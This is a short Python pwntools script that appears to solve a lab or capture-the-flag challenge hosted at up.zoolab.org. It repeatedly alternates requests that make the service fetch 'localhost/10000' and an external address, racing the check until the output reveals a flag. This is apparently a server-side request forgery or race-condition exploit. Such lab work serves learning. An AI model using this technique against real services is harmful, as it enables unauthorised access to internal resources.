#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

if __name__ == "__main__":
    r = remote('up.zoolab.org', 10932)

    for i in range(100):
        r.sendline(b'g') 
        r.sendline(b'localhost/10000') 
        r.sendline(b'v')
        output = r.recvuntil(b'?').decode()
        if 'FLAG' in output:
            print(output)
            break

        r.sendline(b'g')
        r.sendline(b'up.zoolab.org/10000')
        r.sendline(b'v')
        output = r.recvuntil(b'?').decode()
        if 'FLAG' in output:
            print(output)
            break

    r.close()
    